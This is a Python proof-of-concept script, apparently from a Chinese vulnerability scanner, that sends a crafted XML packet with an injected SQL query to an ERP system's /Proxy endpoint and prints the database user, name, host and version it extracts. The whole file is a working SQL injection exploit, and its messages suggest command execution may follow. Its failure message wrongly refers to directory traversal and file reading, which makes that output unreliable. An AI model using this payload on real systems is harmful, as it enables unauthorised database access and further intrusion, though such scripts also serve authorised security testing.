import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import re



def nc_erp_sql(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    check_url = urldata + "Proxy"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = """cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">select 1,user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>"""
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url=check_url, headers=headers, data=data, timeout=10)
        row_1 = '<ROW COLUMN1="1"'
        row_2 = r'COLUMN2="(.*?)"'
        row_3 = r'COLUMN3="(.*?)"'
        row_4 = r'COLUMN4="(.*?)"'
        row_5 = r'COLUMN5="(.*?)"'
        if row_1 in response.text and "服务器错误信息：null" not in response.text:
            db_user = re.findall(row_2, response.text)[0]
            db_name = re.findall(row_3, response.text)[0]
            db_host = re.findall(row_4, response.text)[0]
            db_vers = re.findall(row_5, response.text)[0]
            print(Vcolors.RED +"[+] 该系统存在SQL漏洞，漏洞响应为" +Vcolors.ENDC)
            print(Vcolors.RED + "[+] >> 数据库用户为:{}".format(db_user) + Vcolors.ENDC)
            print(Vcolors.RED + "[+] >> 数据库名为:{}".format(db_name) + Vcolors.ENDC)
            print(Vcolors.RED + "[+] >> 数据库主机名为:{}".format(db_host) + Vcolors.ENDC)
            print(Vcolors.RED + "[+] >> 数据库版本为:{}".format(db_vers) + Vcolors.ENDC)
            print(Vcolors.RED + "[+] 该漏洞有可能可执行命令，请到移步到poc/nc_erp_sql.py进行检查确认" + Vcolors.ENDC)
            return db_name
        else:
            print(Vcolors.WARNING + "[x] 该系统不存在目录遍历和任意文件读取"+ Vcolors.ENDC)
    except:
        logging.error("nc_erp_sql脚本出现异常")


